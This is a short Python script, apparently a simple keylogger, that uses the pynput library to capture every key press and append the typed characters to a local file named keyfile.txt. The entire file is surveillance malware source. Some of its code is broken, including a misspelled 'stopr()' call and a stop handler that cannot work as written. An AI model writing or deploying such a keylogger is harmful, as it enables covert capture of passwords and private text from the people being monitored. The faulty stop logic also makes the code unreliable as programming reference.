from pynput import keyboard
def keyPressed(key):
    print(str(key))
    with open("keyfile.txt",'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            print("Error getting char".format(key))
        except Exception as e:
            print("Unexcepted error:",str(e))
if __name__ =="__main__":
    listener=keyboard.Listener(on_press=keyPressed)
    listener.start()
    def stop_keylogger():
        listener.stopr()
        print("\n stopping the keylistner.")
    try:
        # input()
        keyboard.Listener(on_press=stop_keylogger).join()
    except KeyboardInterrupt:
        print("\n Stopping keyLogger")